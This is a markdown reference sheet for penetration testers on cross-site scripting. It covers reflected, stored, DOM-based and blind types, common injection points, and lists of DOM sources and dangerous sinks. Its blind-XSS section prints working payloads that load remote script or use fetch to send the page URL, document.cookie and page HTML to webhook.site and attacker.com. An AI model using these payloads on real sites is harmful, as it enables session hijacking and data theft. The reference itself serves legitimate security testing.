# XSS Types and Sinks — Complete Reference

## Reflected XSS
- Input from URL/request reflected directly in response
- Requires victim to click crafted link
- Single request — payload not stored
- Severity: Medium (requires user interaction)

### Common Reflected Locations
- Search results pages: `?q=<payload>`
- Error messages: `?error=<payload>`
- URL path: `/page/<payload>`
- Redirect URLs: `?redirect=javascript:alert(1)`

## Stored XSS
- Input persisted in database/storage
- Executes when ANY user views the page
- No victim interaction beyond normal browsing
- Severity: High (affects all users who view stored content)

### Common Storage Points
- User profiles (name, bio, avatar URL)
- Comments, reviews, forum posts
- Support tickets
- Blog posts/articles
- File upload filenames
- Chat messages
- Email subjects (webmail)

## DOM-Based XSS
- Payload processed entirely in client-side JavaScript
- Server never sees or reflects the malicious payload
- Often triggered via URL fragment (#) which isn't sent to server
- Severity: Medium (requires user interaction)

### DOM Sources (Input)
```javascript
document.URL             // Full URL
document.documentURI     // Document URI
document.referrer        // Referrer header
location.href            // Full URL
location.search          // Query string (?...)
location.hash            // Fragment (#...)
location.pathname        // URL path
window.name              // Window name (persists across navigations)
document.cookie          // Cookies
Web Storage              // localStorage/sessionStorage
postMessage              // Cross-origin messages
```

### DOM Sinks (Dangerous Output)
```javascript
// HTML injection sinks
element.innerHTML = ...
element.outerHTML = ...
document.write(...)
document.writeln(...)

// JavaScript execution sinks
eval(...)
setTimeout(string, ...)
setInterval(string, ...)
Function(string)()
new Function(string)()

// URL/navigation sinks
element.src = ...
element.href = ...
element.action = ...
location = ...
location.href = ...
location.replace(...)
window.open(...)

// jQuery-specific sinks
$(userInput)             // Selector injection → HTML creation
$.html(userInput)        // Direct HTML insertion
$.append(userInput)      // Append HTML
$.after(userInput)       // Insert HTML after
$.before(userInput)      // Insert HTML before
```

## Blind XSS
- Payload stored and executes in a different application/context
- Attacker cannot directly observe execution
- Must use callback mechanism to confirm execution
- Severity: High (often executes in admin/internal contexts)

### Target Contexts
- Admin panels (user management, log viewers)
- Support ticket systems
- Error logging dashboards
- Email/webmail viewers
- API documentation generators
- PDF/report generators that render HTML

### Detection via Callbacks
```javascript
// XSS Hunter style callback
'"><script src=https://YOUR_INSTANCE.xss.ht></script>

// Custom callback
'"><img src=x onerror="fetch('https://webhook.site/UUID?'+document.domain)">

// With full context capture
'"><script>
fetch('https://attacker.com/blind', {
  method: 'POST',
  body: JSON.stringify({
    url: location.href,
    cookie: document.cookie,
    dom: document.body.innerHTML.substring(0,1000)
  })
});
</script>
```
